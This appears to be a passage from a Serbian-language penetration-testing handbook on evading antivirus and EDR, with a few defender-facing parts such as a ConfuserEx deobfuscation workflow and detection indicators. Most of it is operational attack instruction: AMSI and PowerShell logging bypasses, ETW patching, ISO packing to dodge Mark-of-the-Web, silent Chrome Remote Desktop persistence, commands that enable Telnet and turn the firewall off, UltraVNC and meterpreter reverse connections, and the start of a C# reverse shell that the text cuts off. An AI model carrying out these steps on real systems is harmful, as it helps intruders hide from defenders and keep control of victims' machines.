Listu AV/EDR proizvoda koji koriste AMSI možete pronaći na **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Koristite PowerShell verziju 2**
Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa možete da pokrećete skripte bez AMSI skeniranja. To možete da uradite ovako:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging je funkcija koja omogućava beleženje svih PowerShell komandi izvršenih na sistemu. To može biti korisno za potrebe revizije i rešavanja problema, ali može predstavljati i **problem za napadače koji žele da izbegnu otkrivanje**.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Onemogućite PowerShell Transcription i Module Logging**: U tu svrhu možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Koristite PowerShell verziju 2**: Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa možete pokretati skripte bez AMSI skeniranja. To možete uraditi ovako: `powershell.exe -version 2`
- **Koristite unmanaged PowerShell sesiju**: Koristite [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da biste pokrenuli PowerShell bez pokretanja procesa `powershell.exe` (pristup koji koristi `powerpick` u Cobalt Strike-u). Time se zaobilaze kontrole vezane konkretno za proces `powershell.exe`, ali se time ne onemogućavaju AMSI, Script Block Logging niti sve druge PowerShell odbrane; obuhvat zavisi od runtime okruženja i implementacije hosta.


## Obfuskacija

> [!TIP]
> Nekoliko tehnika obfuskacije oslanja se na šifrovanje podataka, što povećava entropiju binarne datoteke i olakšava AV-ovima i EDR-ovima da je otkriju. Budite oprezni i možda primenite šifrovanje samo na određene delove koda koji su osetljivi ili ih je potrebno sakriti.

### Deobfuskacija .NET binarnih datoteka zaštićenih pomoću ConfuserEx

Prilikom analize malware-a koji koristi ConfuserEx 2 (ili komercijalne fork-ove), često se nailazi na nekoliko slojeva zaštite koji ometaju dekompilatore i sandbox okruženja. Radni postupak u nastavku pouzdano **vraća IL skoro u originalno stanje**, nakon čega ga je moguće dekompilirati u C# pomoću alata kao što su dnSpy ili ILSpy.<sup>[[10]](#references)</sup>

1.  Uklanjanje zaštite od neovlašćenih izmena – ConfuserEx šifruje svako *telo metode* i dešifruje ga unutar statičkog konstruktora *modula* (`<Module>.cctor`). Takođe menja PE checksum, pa će svaka izmena izazvati rušenje binarne datoteke. Koristite **AntiTamperKiller** da pronađete šifrovane tabele metapodataka, oporavite XOR ključeve i ponovo napravite čistu assembly datoteku:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Izlaz sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni pri izradi sopstvenog unpacker-a.

2.  Oporavak simbola / toka kontrole – prosledite *clean* datoteku alatu **de4dot-cex** (fork alata de4dot koji podržava ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Zastavice:
     • `-p crx` – izaberite ConfuserEx 2 profil
     • de4dot će poništiti control-flow flattening, vratiti originalne prostore imena, klase i nazive promenljivih i dešifrovati konstantne stringove.

3.  Proxy-call stripping – ConfuserEx zamenjuje direktne pozive metoda jednostavnim omotačima (tzv. *proxy calls*) kako bi dodatno otežao dekompilaciju. Uklonite ih pomoću **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Nakon ovog koraka trebalo bi da vidite uobičajene .NET API-je, kao što su `Convert.FromBase64String` ili `AES.Create()`, umesto neprozirnih omotačkih funkcija (`Class8.smethod_10`, …).

4.  Ručno čišćenje – pokrenite dobijeni binarni fajl u dnSpy-ju i potražite velike Base64 blokove ili upotrebu `RijndaelManaged`/`TripleDESCryptoServiceProvider` da biste pronašli *stvarni* payload.  Zlonamerni softver ga često čuva kao TLV-kodiran niz bajtova inicijalizovan unutar `<Module>.byte_0`.

Ovaj niz koraka obnavlja tok izvršavanja **bez** pokretanja zlonamernog uzorka – korisno pri radu na radnoj stanici bez pristupa mreži.

> 🛈  ConfuserEx generiše prilagođeni atribut pod nazivom `ConfusedByAttribute`, koji se može koristiti kao IOC za automatsku trijažu uzoraka.

#### Jednolinijska naredba
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi fork LLVM kompilacionog paketa otvorenog koda koji omogućava veću bezbednost softvera putem [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zaštite od neovlašćenih izmena.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstrira kako koristiti jezik `C++11/14` za generisanje obfuskovanog koda tokom kompilacije, bez korišćenja eksternih alata i bez izmene kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuskovanih operacija koje generiše C++ template metaprogramming framework, čime se osobi koja želi da probije aplikaciju posao donekle otežava.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može da obfuskuje različite PE fajlove, uključujući: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan engine za metamorphic code za proizvoljne izvršne fajlove.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je framework za fino granularnu code obfuscation za jezike koje podržava LLVM, a koji koristi ROP (return-oriented programming). ROPfuscator obfuskuje program na nivou assembly koda tako što regularne instrukcije pretvara u ROP lance, čime narušava našu uobičajenu predstavu o normalnom toku upravljanja.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nim-u
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da konvertuje postojeće EXE/DLL fajlove u shellcode, a zatim da ih učita

### Samomaskiranje po funkciji uz pomoć LLVM kompajlera

Umesto da maskira ceo implant samo dok miruje, izmenjeni LLVM X86 backend može da XOR-maskira odabrane funkcije kad god nisu aktivne. Function Peekaboo PoC bira demanglovana imena koja sadrže `REG_`, ubacuje position-independent ulazne/izlazne stubove oko konačnog mašinskog koda i emituje jedan zajednički handler za maskiranje u `.text`; potpisi na nivou izvornog koda i Windows x64 calling convention ostaju nepromenjeni.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformacija toka upravljanja u backend-u

Ovo treba uraditi nakon odabira instrukcija i optimizacije, jer transformacija mora da obuhvati **svaki emitovani povratak** i da zna tačan raspored x86 koda. `MachineFunctionPass` koji se izvršava pre emitovanja pronalazi poslednji `MachineInstr::isReturn()`, briše ga tako da se poslednja putanja nastavlja u dodati epilog, a ranije povratke zamenjuje sa `JMP_1 handler`. Zadržite svako uklanjanje steka/okvira koje je kompajler generisao pre svakog povratka; preusmerite samo samu instrukciju povratka.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` i `emitFunctionBodyEnd()` emituju stubove za svaku funkciju, dok `emitEndOfAsmFile()` emituje handler. Simboli koji se dele između faza emitovanja omogućavaju da grana u prologu cilja kasniji epilog; za ručno emitovan near `je`, napišite `0F 84`, a zatim četvorobajtni MC izraz `target - address_after_je`. Pozivi i skokovi ka handler-u mogu se umesto toga emitovati kao `MCInst` objekti (`CALL64pcrel32` i `JMP_1`). Pass mora da vrati `false` za neizabranu funkciju ako nije ništa promenio; PoC pogrešno vraća `true` u tom slučaju.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metapodaci i inicijalizacija pre CRT-a

PoC smešta XOR ključ i zapise od 16 bajtova koji sadrže pokazivač na funkciju koji je loader relocirao, kao i dužinu određenu tokom izvršavanja, u `.funcmeta`. Iako je C polje `uint32_t`, handler pristupa QWORD vrednosti na pomeraju `+8` u zapisu, čime obuhvata dužinu i njeno popunjavanje, a zapise obrađuje u koracima od `0x10`. Imena PE sekcija zauzimaju samo osam bajtova, pa pretraga tokom izvršavanja vidi `.funcmet`. Eksterni patcher dodaje izvršnu sekciju `.stub`, čuva staru RVA ulazne tačke u stub-u i preusmerava `AddressOfEntryPoint`; PIC stub dobija osnovnu adresu slike preko `gs:[0x60]` → `[PEB+0x10]`, prolazi kroz PE32+ uvoze da bi pronašao već uvezeni `VirtualProtect` i pokreće se pre CRT-a.<sup>[[38]](#references)[[39]](#references)</sup>

Inicijalizacija postavlja sentinel u `gs:[0xE8]` i poziva svaku funkciju iz metapodataka. Trajno čitljiv prolog upisuje početak funkcije u `gs:[0xF0]`, prepoznaje sentinel i preskače telo koje je i dalje dešifrovano. Epilog zatim koristi `call handler`; nakon što handler sačuva 13 registara (`0x68` bajtova), povratna adresa na `[rsp+0x68]` predstavlja kraj transformisane funkcije, pa se `end - start` može upisati u njen zapis metapodataka. Stub briše sentinel i skače na `ImageBase + original_entry_point_RVA` nakon što su sva tela maskirana.<sup>[[38]](#references)[[39]](#references)</sup>

Tokom uobičajenog poziva, prolog poziva isti simetrični handler da bi dekodirao telo. Poslednja putanja nastavlja se u dodati epilog, dok svaki raniji povratak skače direktno do zajedničkog handler-a. Uobičajeni epilog takođe koristi `jmp handler` umesto `call`, pa nakon ponovnog maskiranja `ret` iz handler-a preuzima povratnu adresu prvobitnog pozivaoca i čuva rezultat funkcije u `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitiva za maskiranje i indikatori analize

Handler pronalazi trenutni zapis, preskače fiksni vidljivi prolog (u ovoj verziji dugačak `0x46` bajtova), menja zaštitu ostatka u `PAGE_EXECUTE_READWRITE`, XOR-uje ga bajt po bajt donjim bajtom ključa, a zatim postavlja zaštitu na `PAGE_EXECUTE_READ`. Ista petlja zato dekodira pri ulasku i kodira pri svakom uobičajenom izlasku.<sup>[[38]](#references)[[39]](#references)</sup>

Indikatori ovog dizajna sa visokom signalnom vrednošću uključuju:<sup>[[38]](#references)[[39]](#references)</sup>

- ulaznu tačku unutar izvršne sekcije `.stub` i sekciju `.funcmet` koja sadrži ključ i relocirane pokazivače na `.text`;
- parsiranje PEB-a, tabele uvoza i tabele sekcija pre CRT-a, nakon čega slede pozivi preko svakog pokazivača u metapodacima;
- identične PIC prologe tipa `call`/`pop` i veliki broj povratnih mesta preusmerenih na jedan handler;
- upise u `gs:[0xE8]`, `gs:[0xF0]` i `gs:[0xF8]`, praćene ponovljenim promenama zaštite preko `VirtualProtect` i bajt-po-bajt XOR upisima u izvršne stranice koje podržava slika.

Ovo je izbegavanje memory scanner-a, a ne kriptografska zaštita: zakrpljeni fajl i dalje sadrži prvobitno dešifrovano telo, a debugger može da postavi breakpoint na `VirtualProtect` ili XOR petlju i izvuče aktivnu funkciju. Jednobajtni XOR, čitljivi metapodaci i fiksna granica `0x46` takođe olakšavaju offline oporavak.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> TEB slot-ovi u PoC-u su lokalni za nit, ali izmenjene stranice koda važe za ceo proces. Istovremeni ili rekurzivni ulasci zato mogu ponovo da preokrenu instrukcije dok ih drugo izvršavanje koristi; izuzeci i nestandardni izlazi iz funkcije takođe mogu da zaobiđu ponovno maskiranje. Robusna implementacija mora da sinhronizuje promene, vrati zaštitu koja je stvarno dobijena preko `lpflOldProtect`, izbegava hard-kodirane dužine stub-ova, proveri poravnanje steka x64 u putanjama `call` i `jmp`, i pozove `FlushInstructionCache` nakon izmene izvršnih bajtova. Microsoft izričito navodi da je pozivalac odgovoran za koherentnost keša instrukcija kada se izvršni kod menja.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Možda ste videli ovaj ekran prilikom preuzimanja nekih izvršnih fajlova sa interneta i njihovog pokretanja.

Microsoft Defender SmartScreen je bezbednosni mehanizam namenjen zaštiti krajnjeg korisnika od pokretanja potencijalno zlonamernih aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom koristi pristup zasnovan na reputaciji, što znači da će neuobičajeno preuzimane aplikacije aktivirati SmartScreen, koji će upozoriti krajnjeg korisnika i sprečiti njegovo pokretanje fajla (mada se fajl i dalje može pokrenuti klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) pod nazivom Zone.Identifier, koji se automatski kreira pri preuzimanju fajlova sa interneta, zajedno sa URL adresom sa koje su preuzeti.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS-a za fajl preuzet sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da izvršni fajlovi potpisani **pouzdanim** sertifikatom za potpisivanje **neće aktivirati SmartScreen**.

Veoma efikasan način da sprečite da vaši payloads dobiju Mark of The Web jeste da ih zapakujete u neku vrstu kontejnera, kao što je ISO. To je zato što se Mark-of-the-Web (MOTW) **ne može** primeniti na volumene koji **nisu NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payloads u izlazne kontejnere radi izbegavanja Mark-of-the-Web-a.

Primer upotrebe:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Evo demonstracije za zaobilaženje SmartScreen-a pakovanjem payload-ova u ISO datoteke pomoću alata [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za beleženje događaja u Windows-u koji aplikacijama i sistemskim komponentama omogućava da **beleže događaje**. Međutim, bezbednosni proizvodi mogu da ga koriste i za nadgledanje i otkrivanje zlonamernih aktivnosti.

Slično načinu na koji se AMSI onemogućava (zaobilazi), moguće je i da se funkcija **`EtwEventWrite`** procesa u korisničkom prostoru izmeni tako da se odmah vrati, bez beleženja događaja. To se postiže izmenom funkcije u memoriji tako da se odmah vrati, čime se efektivno onemogućava ETW beleženje za taj proces.

Više informacija možete pronaći na adresama **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) i [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Refleksija C# sklopova

Učitavanje C# binarnih datoteka u memoriju poznato je već dugo i još uvek predstavlja veoma dobar način za pokretanje post-exploitation alata bez otkrivanja od strane AV-a.

Pošto će se payload učitati direktno u memoriju, bez dodirivanja diska, treba da brinemo samo o patch-ovanju AMSI-ja za ceo proces.

Većina C2 framework-a (sliver, Covenant, metasploit, CobaltStrike, Havoc itd.) već omogućava direktno izvršavanje C# sklopova u memoriji, ali to se može uraditi na različite načine:

- **Fork\&Run**

Ovo podrazumeva **pokretanje novog žrtvenog procesa**, ubacivanje zlonamernog post-exploitation koda u taj novi proces, izvršavanje zlonamernog koda i gašenje novog procesa po završetku. Ovaj pristup ima i prednosti i nedostatke. Prednost metode fork and run je u tome što se izvršavanje odvija **izvan** našeg Beacon implant procesa. To znači da postoji **mnogo veća verovatnoća** da će naš **implant preživeti** ako nešto pođe po zlu tokom post-exploitation aktivnosti ili bude otkriveno. Nedostatak je **veća verovatnoća** da će vas uhvatiti **bihevioralne detekcije**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Ovde se zlonamerni post-exploitation kod ubacuje **u sopstveni proces**. Tako možete da izbegnete kreiranje novog procesa i njegovo skeniranje od strane AV-a, ali nedostatak je **mnogo veća verovatnoća** da ćete **izgubiti svoj beacon** ako nešto pođe po zlu tokom izvršavanja payload-a, jer proces može da se sruši.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite da saznate više o učitavanju C# sklopova, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# sklopove možete učitavati i **iz PowerShell-a**; pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [video S3cur3th1sSh1t-a](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## NativeAOT WebAssembly prepakovanje .NET alata (WasmForge)

Uobičajene tehnike `execute-assembly` zadržavaju prepoznatljiv MSIL i na kraju inicijalizuju CLR. **WasmForge** umesto toga menja okruženje za izvršavanje: prebacuje C# projekat na eksperimentalni NativeAOT-LLVM WASI cilj, unapred ga kompajlira u WebAssembly i ugrađuje taj modul u Windows PE host zasnovan na Wazero-u. Dobijeni proces ne zahteva CLR, JIT ni `dotnet` host na ciljnom sistemu, pa pravila zasnovana samo na nazivima upravljanih sklopova, učitavanju CLR-a, AMSI-ju ili .NET ETW-u gube direktan uvid. Ovo je tehnika izbegavanja detekcije i pakovanja, a ne zaobilaženje granice privilegija — gost zadržava dozvole originalnog alata i njegovo uočljivo ponašanje na nivou OS-a.<sup>[[44]](#references)[[45]](#references)</sup>

### Izgradnja C# projekta

Preporučeni način izgradnje je Docker okruženje projekta jer uključuje .NET 10 SDK, NativeAOT-LLVM workload, WASI SDK 24.0, linker i zavisnosti za potpisivanje. `.csproj` se automatski prepoznaje; jednokratna izgradnja obavlja migraciju, zakrpe kompatibilnosti, WASM kompilaciju, izradu PE datoteke i potpisivanje.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Za otklanjanje problema ili pregled generisanog koda, podelite postupak na `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` i završni `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Slika za build takođe koristi omotač `wasm-component-ld` da bi izbegla kodiranje komponenti WASI Preview 2 i proizvela običan modul koji očekuje ugrađeno runtime okruženje.<sup>[[44]](#references)[[45]](#references)</sup>

### Povezivanje wasm32 C# koda sa x64 Win32 kodom

Ovo nije transparentno ponovno kompajliranje. NativeAOT-WASI nema neke funkcije BCL-a namenjene Windowsu ili ih menja, a wasm32 gost obično alocira četvorobajtna mesta za pokazivače, dok x64 API-ji mogu da vrate osmobajtne pokazivače. WasmForge rešava oba problema pomoću sledećih generisanih slojeva:<sup>[[44]](#references)</sup>

1. Patcher izvornog koda ispravlja semantičke razlike specifične za AOT i preusmerava nepodržane pozive registry-ja, pipes, WMI-ja, identiteta, directory-service-a, verzije datoteka, LSA-e i slične pozive na `Wf*` pomoćne funkcije.
2. P/Invoke skener generiše NativeAOT `DirectPInvoke` mapiranja, tako da se pozivi `[DllImport]` povezuju sa C bridge simbolima uključenim u linkovanu datoteku, umesto da se deklarisani DLL dinamički učitava unutar gosta.
3. Pokazivači usmereni ka hostu koriste `ulong` u C#-u i `uint64_t` u C-u. Generički dispečer prosleđuje poziv Win32 obrađivaču na hostu; `out8_mask` označava stvarna osmobajtna izlazna mesta čije gornje polovine moraju da se sačuvaju. Za neoznačene izlaze u wasm32 formatu koristi se zaštita snapshot/restore, kako upis x64 koda ne bi oštetio susedna četiri bajta.
4. Namenski host bridge-ovi obrađuju operacije koje se ne uklapaju u generičko prosleđivanje sistemskih poziva, kao što su pristup kešu LSA tiketa, Kerberos/BCrypt operacije sa strukturiranim rezultatima, TCP KDC saobraćaj i LDAP upiti.

Na primer, omotač za `version.dll!VerQueryValueW` prosleđuje četiri host adrese i postavlja bitove 2 i 3 (`0xC`), jer su pokazivač na vrednost i dužina osmobajtna izlazna mesta. Sam omotač ostaje generički i prosleđuje naziv DLL-a, naziv exporta, argumente i masku funkciji `wf_call_v2`; host obavlja prevođenje pokazivača i poziva nativni API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Ograničenja i tačke za detekciju

Kod koji intenzivno koristi reflection, dinamičko učitavanje assembly-ja, proizvoljne native callback funkcije i složene x64 strukture koje se vraćaju u WASM memoriju i dalje može zahtevati zakrpe za pojedinačne alate ili potpuno da otkaže. Generički WASI Preview 2 sockets takođe mogu da pozivaju no-op stubs, pa podržani alati koriste host shim-ove specifične za protokol. Proverite svaku komandu u odnosu na native build umesto da pretpostavljate da su funkcionalnosti jednake.<sup>[[44]](#references)[[45]](#references)</sup>

Ova tehnika preusmerava telemetriju umesto da payload učini nevidljivim. Detekcija se može usmeriti na PE koji sadrži WASM modul ili ga materijalizuje, ponašanje nalik Wazero runtime-u, neuobičajenu alokaciju i kopiranje host/guest memorije, generičko direktno pozivanje Win32 funkcija, anomalije u potpisivanju i PE resursima, kao i naknadne API pozive i mrežni saobraćaj. Zato odsustvo CLR-load, AMSI ili .NET ETW događaja ne treba smatrati dokazom da je proces bezazlen.<sup>[[44]](#references)</sup>

## Korišćenje drugih programskih jezika

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršavati zlonamerni kod pomoću drugih jezika tako što se kompromitovanoj mašini omogući pristup **okruženju interpretera instaliranom na SMB share-u pod kontrolom napadača**.

Omogućavanjem pristupa interpreter binaries i okruženju na SMB share-u, možete **izvršavati proizvoljan kod na tim jezicima u memoriji** kompromitovane mašine.

U repozitorijumu se navodi: Defender i dalje skenira skripte, ali korišćenjem Go, Java, PHP itd. imamo **veću fleksibilnost za zaobilaženje statičkih potpisa**. Testiranje nasumičnih, neobfuskovanih reverse shell skripti na ovim jezicima pokazalo se uspešnim.

## Ponovno hostovanje WebAssembly-ja radi izbegavanja statičke analize

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping manipuliše access token-om bezbednosnog proizvoda kao što je EDR ili AV. Smanjivanje privilegija token-a može ostaviti proces aktivnim, a istovremeno ga sprečiti da obavlja privilegovane radnje inspekcije ili otklanjanja problema.

Da bi se to sprečilo, Windows bi mogao da **spreči spoljne procese** da dobiju handles za tokene bezbednosnih procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Korišćenje pouzdanog softvera

### Chrome Remote Desktop

Kao što je opisano u [**ovoj objavi na blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je instalirati Chrome Remote Desktop na računar žrtve, a zatim ga koristiti za preuzimanje kontrole nad računarom i održavanje perzistencije:<sup>[[35]](#references)</sup>
1. Preuzmite ga sa https://remotedesktop.google.com/, kliknite na „Set up via SSH“, a zatim kliknite na MSI datoteku za Windows da biste je preuzeli.
2. Pokrenite instalacioni program tiho na računaru žrtve (potrebna su administratorska prava): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na stranicu Chrome Remote Desktop i kliknite na Next. Čarobnjak će zatim zatražiti autorizaciju; kliknite na dugme Authorize da biste nastavili.
4. Izvršite dostavljenu komandu uz potrebna podešavanja: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parametar `--pin` postavlja PIN bez korišćenja GUI-ja).
 

## Napredno izbegavanje detekcije

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Izbegavanje detekcije je veoma složena tema; ponekad morate uzeti u obzir mnogo različitih izvora telemetrije u jednom sistemu, pa je gotovo nemoguće ostati potpuno neotkriven u zrelim okruženjima.

Svako okruženje na koje naiđete imaće svoje prednosti i slabosti.

Preporučujem da pogledate ovo predavanje autora [@ATTL4S](https://twitter.com/DaniLJ94) kako biste stekli osnovu za naprednije tehnike izbegavanja detekcije.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je još jedno odlično predavanje autora [@mariuszbit](https://twitter.com/mariuszbit) o višeslojnom izbegavanju detekcije.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Stare tehnike**

### **Provera koje delove Defender prepoznaje kao zlonamerne**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), koji će **uklanjati delove binarne datoteke** dok **ne utvrdi koji deo Defender prepoznaje** kao zlonameran, a zatim će ga izdvojiti.\
Još jedan alat koji radi **isto je** [**avred**](https://github.com/dobin/avred), uz javno dostupnu veb-uslugu na adresi [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet server**

Do Windows 10 uključujući njega, svi Windows sistemi dolazili su sa **Telnet serverom** koji ste mogli da instalirate (kao administrator) ovako:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Neka se **pokreće** pri pokretanju sistema i **pokreni** ga sada:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Promenite telnet port** (stealth) i onemogućite firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Preuzmite ga sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrebna su vam bin preuzimanja, a ne instalacija)

**NA HOSTU**: Pokrenite _**winvnc.exe**_ i podesite server:

- Omogućite opciju _Disable TrayIcon_
- Postavite lozinku u _VNC Password_
- Postavite lozinku u _View-Only Password_

Zatim premestite binarnu datoteku _**winvnc.exe**_ i **novonastalu** datoteku _**UltraVNC.ini**_ na **žrtvu**

#### **Reverse connection**

**Napadač** treba da pokrene binarnu datoteku `vncviewer.exe -listen 5900` na svom **hostu**, kako bi bila spremna da prihvati obrnutu **VNC vezu**. Zatim, na **žrtvi**: Pokrenite winvnc daemon pomoću `winvnc.exe -run`, a potom pokrenite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UPOZORENJE:** Da biste ostali neprimećeni, nemojte raditi sledeće:

- Nemojte pokretati `winvnc` ako je već pokrenut jer ćete izazvati [iskačući prozor](https://i.imgur.com/1SROTTl.png). Proverite da li je pokrenut pomoću `tasklist | findstr winvnc`
- Nemojte pokretati `winvnc` bez datoteke `UltraVNC.ini` u istom direktorijumu jer će se otvoriti [prozor za konfiguraciju](https://i.imgur.com/rfMQWcf.png)
- Nemojte pokretati `winvnc -h` za pomoć jer ćete izazvati [iskačući prozor](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite ga sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Unutar GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Sada **pokrenite lister** pomoću `msfconsole -r file.rc` i **izvršite** **xml payload** pomoću:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Trenutni Defender će veoma brzo prekinuti proces.**

### Kompajliranje sopstvenog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Revershell

Kompajlirajte ga pomoću:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Koristite ga sa:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
